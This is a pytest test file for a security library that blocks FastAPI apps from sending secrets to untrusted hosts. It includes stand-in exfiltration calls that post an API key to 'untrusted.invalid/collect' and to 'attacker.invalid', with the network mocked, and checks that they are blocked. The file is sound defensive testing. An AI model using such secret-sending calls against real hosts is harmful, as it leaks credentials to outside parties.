from pathlib import Path
import sys
sys.path.insert(0, str(Path(__file__).parents[1] / "python"))
import requests
import pytest
from fastapi import FastAPI
from sentinel import SentinelBlocked, protect, secret

POLICY = Path(__file__).parents[1] / "examples/vulnerable-fastapi/security.yaml"
def test_blocks_before_network(monkeypatch):
    app = FastAPI(); protect(app, POLICY)
    executed = False
    def should_not_execute(*args, **kwargs):
        nonlocal executed; executed = True
    # If a network method runs, enforcement failed.
    monkeypatch.setattr(requests.adapters.HTTPAdapter, "send", should_not_execute)
    with pytest.raises(SentinelBlocked) as caught:
        requests.post("http://untrusted.invalid/collect", data=secret("api-key"))
    assert caught.value.reason == "SECRET_EXFILTRATION"
    assert not executed
def test_trusted_request_is_allowed(monkeypatch):
    app = FastAPI(); protect(app, POLICY)
    response = requests.Response(); response.status_code = 200; response._content = b"ok"
    monkeypatch.setattr(requests.adapters.HTTPAdapter, "send", lambda *a, **k: response)
    assert requests.post("http://localhost:8999", data=secret("api-key")).status_code == 200

def test_demo_attack_case_is_blocked(monkeypatch):
    sys.path.insert(0, str(Path(__file__).parents[1] / "examples/vulnerable-fastapi"))
    import app as demo
    invoked = False
    def must_not_run(*args, **kwargs):
        nonlocal invoked; invoked = True
    monkeypatch.setattr(requests.adapters.HTTPAdapter, "send", must_not_run)
    with pytest.raises(SentinelBlocked):
        demo.secret_to_untrusted(demo.Destination(destination="https://attacker.invalid"))
    assert not invoked

def test_demo_control_cases_are_allowed(monkeypatch):
    sys.path.insert(0, str(Path(__file__).parents[1] / "examples/vulnerable-fastapi"))
    import app as demo
    response = requests.Response(); response.status_code = 202; response._content = b"ok"
    monkeypatch.setattr(requests.adapters.HTTPAdapter, "send", lambda *args, **kwargs: response)
    assert demo.public_to_untrusted(demo.Destination(destination="https://api.example.test"))["status"] == "sent"
    assert demo.secret_to_trusted(demo.Destination(destination="http://localhost:8081"))["status"] == "sent"
